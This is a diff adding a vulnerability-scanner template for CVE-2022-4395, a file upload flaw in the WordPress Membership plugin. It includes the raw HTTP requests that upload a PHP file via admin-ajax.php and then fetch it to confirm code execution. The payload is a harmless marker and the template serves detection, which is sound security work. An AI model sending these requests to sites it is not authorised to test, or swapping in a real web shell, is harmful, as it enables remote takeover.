@@ -1,0 +1,46 @@
+id: wordpress-plugin-membership-file-upload
+info:
+  name: WordPress Plugin Membership File Upload Vulnerability (CVE-2022-4395)
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress plugin Membership versions before 2.1.7 have a file upload vulnerability. Attackers can exploit this issue to upload arbitrary files, such as malicious PHP code, and execute code remotely.
+  reference:
+    - https://wpscan.com/vulnerability/80407ac4-8ce3-4df7-9c41-007b69045c40
+  classification:
+    cve-id: CVE-2022-4395
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.0
+  tags: file-upload,wordpress
+http:
+  - raw:
+      - |
+        POST /wp-admin/admin-ajax.php?action=wps_membership_csv_file_upload HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=------------------------fd13967f633f4335
+
+        --------------------------fd13967f633f4335
+        Content-Disposition: form-data; name="file"; filename="payload.php"
+        Content-Type: text/csv
+
+        <?php echo md5(233);unlink(__FILE__);?>
+        --------------------------fd13967f633f4335--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        GET /wp-content/uploads/mfw-activity-logger/csv-uploads/payload.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "e165421110ba03099a1c0393373c5b43"
